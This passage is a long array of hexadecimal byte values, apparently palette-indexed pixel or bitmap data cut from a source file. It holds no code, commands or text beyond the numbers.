0x9E, 0x9D, 0x9D, 0x9D, 0x9C, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x9C,
0x9E, 0x08, 0x08, 0x08, 0x9E, 0x9B, 0x9B, 0x9B, 0x9E, 0x08, 0x08, 0x9A, 0x9E, 0x08, 0x08, 0x08,
0x08, 0x9E, 0x08, 0x08, 0x08, 0x9A, 0x9E, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x08, 0x14, 0xE3, 0xE4,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE3, 0xE3, 0xE3, 0x14, 0x14, 0x14,
0x99, 0x17, 0x18, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x07, 0x1B, 0x1B, 0x1C,
0x1C, 0x1C, 0x1C, 0x1B, 0x19, 0x9A, 0x14, 0x14, 0x14, 0x08, 0x9A, 0x9B, 0x9C, 0x9B, 0x9B, 0x9A,
0x9B, 0x9B, 0x9C, 0x17, 0x18, 0x17, 0x9A, 0x08, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x9E, 0x9D,
0x9D, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D,
0x9D, 0x9C, 0x9C, 0x9D, 0x9D, 0x9C, 0x17, 0x17, 0x9D, 0x08, 0xE6, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xE4, 0x9A,
0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0xCB, 0x12, 0x11,
0x11, 0x11, 0x12, 0xE6, 0x14, 0xE6, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE7, 0xE5, 0x14, 0x08, 0x9D,
0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18,
0x18, 0x18, 0x18, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x12, 0xE5, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9D, 0x9D,
0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9B, 0x9D, 0x9D, 0x9C, 0x17, 0x17, 0x17, 0x9C,
0x9E, 0x08, 0x08, 0x08, 0x9B, 0x9D, 0x9B, 0x9D, 0x9B, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E,
0x9D, 0x9C, 0x9D, 0x9D, 0x9C, 0x9C, 0x17, 0x9C, 0x9C, 0x9C, 0x9A, 0x08, 0xE4, 0xE2, 0xE3, 0xE4,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x08, 0x9A, 0x17, 0x18, 0x18, 0x19, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x07,
0x07, 0x07, 0x07, 0x19, 0x17, 0x9A, 0x99, 0x9A, 0x99, 0x99, 0x9A, 0x9C, 0x9C, 0x9B, 0x9A, 0x9A,
0x9A, 0x9B, 0x9B, 0x17, 0x18, 0x17, 0x9A, 0x14, 0x14, 0xE4, 0xE4, 0x14, 0x08, 0x08, 0x9E, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x17, 0x17, 0x9E, 0xE5, 0x12, 0x11, 0x11, 0x11, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0xCE, 0xE6, 0xCF, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0x14, 0x9E,
0x16, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9E, 0x9E, 0x9E, 0x9A, 0x08, 0x08, 0xE4, 0x12, 0x11, 0x11,
0x11, 0x11, 0xCF, 0xE5, 0xE5, 0xE7, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0xCF, 0xCF, 0xCF, 0xCE, 0xE7, 0xE6, 0xCE, 0xCE, 0xCA, 0xCF, 0xCA, 0xE3, 0xE4,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x9A, 0x16, 0x16, 0x9B, 0x9B, 0x9B, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17,
0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x17, 0x16,
0x16, 0x16, 0x17, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x11, 0x12, 0xE5, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17,
0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x9C, 0x9D,
0x08, 0xE4, 0xE4, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x9E, 0x9B, 0x9B, 0x9A, 0x9A, 0x14, 0xE4, 0xE3, 0xE3, 0xE3, 0xE4,
0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0x14, 0xE4, 0x14, 0x14,
0x14, 0xE3, 0xCA, 0xC9, 0x12, 0xE2, 0x14, 0x9B, 0x18, 0x18, 0x18, 0x18, 0x17, 0x9B, 0x9A, 0x08,
0x08, 0x08, 0x99, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9A, 0x9B, 0x9B, 0x9B, 0x9B, 0x9A, 0x9A, 0x99,
0x99, 0x9A, 0x9A, 0x9B, 0x17, 0x9C, 0x16, 0x08, 0xE3, 0xCB, 0x14, 0x08, 0x9A, 0x9E, 0x9D, 0x9C,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x9C, 0x17, 0x9C, 0x9C,
0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x08, 0xCF, 0x11, 0x12, 0x12, 0xCF, 0xE6, 0xE6,
0xE6, 0xCE, 0x12, 0x12, 0xCE, 0x13, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0xE6, 0x9F, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9E, 0x9E, 0x08, 0x08, 0xE5, 0x12, 0x11, 0x11,
0x11, 0x12, 0xE5, 0x14, 0xE5, 0xE7, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x00, 0x11, 0x11, 0x12,
0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x12, 0xCA, 0xE6,
0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE3, 0xE3, 0xE3, 0xE2, 0xE2, 0xE2, 0xE6,
0xE6, 0xE6, 0xE6, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2,
0xE2, 0xE2, 0xE2, 0x13, 0x13, 0x13, 0x13, 0xE2, 0xE2, 0xE2, 0xE2, 0x13, 0xCA, 0x12, 0x11, 0x11,
0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x11, 0x11, 0x11, 0xE6, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x17, 0x17,
0x17, 0x17, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x17, 0x9C, 0x9E, 0x08,
0xE4, 0xCD, 0xCD, 0xE5, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE3, 0xE2, 0xE2, 0xE3,
0xE3, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE4, 0xE4, 0xE4,
0xE3, 0xE2, 0xE3, 0x14, 0x14, 0x08, 0x99, 0x9A, 0x9B, 0x17, 0x18, 0x18, 0x17, 0x17, 0x17, 0x9B,
0x99, 0x99, 0x99, 0x99, 0x99, 0x9A, 0x9A, 0x9A, 0x99, 0x99, 0x99, 0x99, 0x9A, 0x9A, 0x9A, 0x99,
0x99, 0x08, 0x08, 0x9A, 0x9A, 0x99, 0x08, 0x08, 0x08, 0x08, 0x9E, 0x9E, 0x08, 0x08, 0x9D, 0x17,
0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9E, 0x14, 0x12, 0x12, 0x12, 0xCF, 0xCF, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0xC9, 0x13, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE4, 0x9E, 0x9B,
0x9E, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9B, 0x9E, 0x08, 0x14, 0xCE, 0x11, 0x11, 0x11,
0x11, 0xE8, 0x14, 0x14, 0xE5, 0xE7, 0xE8, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0xE6, 0xE5,
0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6,
0xE6, 0xE6, 0xE6, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0x13, 0xE6, 0xE6, 0x13, 0x13,
0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0x13, 0xE6, 0x12, 0x11, 0x11, 0x11,
0x11, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x11, 0x12, 0x11, 0x11, 0x12, 0xE3, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14,
0xE4, 0xE5, 0xCD, 0xE5, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE3, 0xE3, 0xE2, 0xE1, 0xCA, 0x12, 0xC9, 0xE1, 0xE2,
0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3,
0xE2, 0xCA, 0xE2, 0x14, 0x08, 0x08, 0x08, 0x99, 0x9A, 0x17, 0x17, 0x18, 0x18, 0x17, 0x9C, 0x9B,
0x08, 0x14, 0x08, 0x08, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,
0x99, 0x99, 0x99, 0x99, 0x99, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0xE4, 0x9E, 0x9C, 0x9C,
0x9C, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C,
0x9C, 0x9C, 0x9C, 0x9D, 0x9D, 0x9D, 0x9E, 0x08, 0xE6, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0xE0, 0x13, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0xCE, 0x08, 0x9C, 0x9D,
0x9D, 0x9C, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9A, 0x9A, 0x9A, 0x08, 0xE5, 0x12, 0x11, 0x11, 0x11,
0x12, 0xE5, 0x14, 0x14, 0xE6, 0xE6, 0xE8, 0xE8, 0xE8, 0xCF, 0xCF, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x00, 0x11, 0x11, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x12, 0xCA, 0xE6, 0xE3,
0xE3, 0xE5, 0xE5, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE3,
0xE3, 0xE6, 0xE6, 0x13, 0xCE, 0xCA, 0xCA, 0xCA, 0xCA, 0xCE, 0xCE, 0x13, 0x13, 0x13, 0xE6, 0xE3,
0xE3, 0xE3, 0xE6, 0xE6, 0xE6, 0xE2, 0xE3, 0xE3, 0xE3, 0xE3, 0xE2, 0xE6, 0x12, 0x11, 0x11, 0x11,
0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x12, 0x11, 0x11, 0x12, 0xE6, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x08, 0x08,
0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0x08, 0x08, 0x08,
0x14, 0xE4, 0xE4, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x14, 0x14, 0xE4, 0xE2, 0xCA, 0xC9, 0xC9, 0xE0, 0xE0, 0xE0, 0xE0, 0xE1, 0xE2,
0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE3,
0xE3, 0xE3, 0xE4, 0x14, 0x14, 0x08, 0x08, 0x99, 0x9C, 0x19, 0x19, 0x18, 0x17, 0x17, 0x9B, 0x99,
0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x08, 0x08, 0x08, 0x08, 0x14, 0xE4, 0x08, 0x9B, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9B, 0x9B, 0x9B, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9D, 0x9C, 0x9C, 0x9D, 0x08, 0xCF, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x12, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0xE6, 0x9F, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x08, 0x14, 0x13, 0x12, 0x11, 0x11, 0x11,
0x12, 0x14, 0x14, 0xE5, 0xE6, 0xE6, 0xE7, 0xCF, 0xCF, 0xCF, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x00, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x13, 0xE5, 0xE3,
0xE5, 0xE5, 0xE3, 0xE3, 0xE5, 0xE3, 0xE6, 0x13, 0xE6, 0xE6, 0x13, 0x13, 0x13, 0x13, 0xE6, 0xE6,
0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0xE6, 0x13, 0x13, 0xCE, 0xCE, 0xCA, 0xCE, 0x13, 0xE3,
0xE3, 0xE3, 0xE6, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xCF, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x11,
0x12, 0x11, 0x11, 0x11, 0x12, 0xE4, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0x14, 0x14, 0x08, 0x9E, 0x9D, 0x9D,
0x9E, 0x08, 0x08, 0x9F, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9E, 0x9E, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C,
0x9C, 0x9C, 0x9B, 0x14, 0xE2, 0xCA, 0xCA, 0xC9, 0xC9, 0xCA, 0xE1, 0xE2, 0xE1, 0xE2, 0xE2, 0xE2,
0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE1, 0xE1, 0xE1, 0xE1, 0xE1, 0xE1, 0xE1, 0xE1, 0xE2, 0xE2, 0xE3,
0xE3, 0xE3, 0x14, 0x14, 0x14, 0x08, 0x08, 0x99, 0x17, 0x19, 0x19, 0x17, 0x9A, 0x99, 0x08, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x99, 0x99, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x14, 0xE4, 0xE4, 0xE4, 0x14, 0x14,
0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x14, 0xE6, 0x12, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11,
0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x12, 0xE6, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x14, 0x08, 0x08, 0x08, 0x08, 0x14, 0xCE, 0x12, 0x11, 0x11, 0x11, 0x12,
0x12, 0xE3, 0xE6, 0x13, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x13, 0xE3, 0xE5, 0xE5,
0xE3, 0xE3, 0xE5, 0xE5, 0xE3, 0xE6, 0x13, 0x13, 0xCE, 0xCE, 0xCE, 0x13, 0xE6, 0xE6, 0xE6, 0xE7,
0xE7, 0xE7, 0xE7, 0xE7, 0xE7, 0xE6, 0xE6, 0xE5, 0xE5, 0xE5, 0xE5, 0xE6, 0x13, 0xCE, 0xCE, 0x13,
0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0x13, 0x11, 0x00, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE8, 0xCF, 0x12, 0x11,
0x11, 0x11, 0x11, 0x12, 0xCF, 0x14, 0x9E, 0x9E, 0x9E, 0x9E, 0x9A, 0x9F, 0x83, 0x9E, 0x9E, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9B, 0x9E, 0x9E, 0x9E, 0x9E, 0x9A, 0x9A, 0x9E, 0x9D, 0x9C, 0x9C, 0x9C,
0x9E, 0x08, 0x08, 0x08, 0x9E, 0x9D, 0x9D, 0x9D, 0x9B, 0x9B, 0x9E, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B,
0x9C, 0x9B, 0x08, 0xC9, 0x12, 0x12, 0xC9, 0xCA, 0xC9, 0xE1, 0xE2, 0xE2, 0xE1, 0xE1, 0xE1, 0xE0,
0xE0, 0xE0, 0xE0, 0xE0, 0xE1, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE1, 0xE1, 0xE2, 0xE2,
0xE2, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0x99, 0x17, 0x18, 0x17, 0x99, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0xE4, 0xE4, 0xE4, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE5, 0xCF, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11,
0x11, 0x12, 0xCE, 0x11, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE5, 0x14, 0x14, 0x14,
0x14, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0xE4, 0xE4, 0xE4, 0xCE, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11,
0x12, 0x13, 0xCF, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x00, 0x00, 0x00, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0xE5, 0xE3, 0xE3, 0xE5,
0xE3, 0xE3, 0xE3, 0xE3, 0xE2, 0xCA, 0xCA, 0xCA, 0xCA, 0x13, 0xE6, 0xE6, 0xE6, 0xE6, 0xE7, 0xE7,
0xE7, 0xE9, 0xE9, 0xE9, 0xEA, 0xE6, 0xE5, 0xE5, 0xE5, 0xE5, 0xE6, 0xE5, 0xE5, 0xE3, 0x13, 0x13,
0xE2, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE4, 0xE3, 0xE3, 0xCA, 0x11, 0x00, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0xCF, 0x12, 0xCF, 0xE8, 0x12, 0x12, 0x12, 0xCF, 0xE6, 0xE5, 0xE6, 0xE8, 0xE8,
0xCF, 0xCF, 0x12, 0x11, 0xCF, 0x08, 0x9E, 0x9D, 0x9D, 0x9B, 0x9E, 0x9E, 0x9B, 0x9D, 0x9D, 0x9D,
0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9D, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9C, 0x9D,
0x08, 0x08, 0x08, 0x08, 0x9E, 0x9E, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9B, 0x9A,
0x08, 0xE2, 0xC9, 0x12, 0xC9, 0xCA, 0xCA, 0xCA, 0xE1, 0xE2, 0xE2, 0xE2, 0xE2, 0xE1, 0xE1, 0xC9,
0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xC9, 0xE1, 0xE1,
0xE2, 0xE2, 0xE2, 0xE3, 0xE2, 0xE2, 0xE2, 0xE4, 0x14, 0x14, 0xE4, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3,
0xE3, 0xE3, 0xE4, 0xE4, 0xE4, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14,
0x14, 0x08, 0x14, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x08, 0x08, 0x08, 0x08, 0x14, 0xE4, 0xE4,
0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0x14, 0x14, 0x08,
0x08, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE5, 0x12, 0x11, 0x11, 0x12, 0x13, 0x13, 0xE3, 0xE2, 0xE2,
0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xE2, 0xCA, 0xCA, 0xE0, 0x13, 0xE0, 0xC9, 0xCA, 0xCA, 0xCA, 0xCF,
0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0xCF, 0xE4, 0x14, 0x14, 0x14,
0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE4, 0xE5, 0xE5, 0xCD, 0xCA, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12,
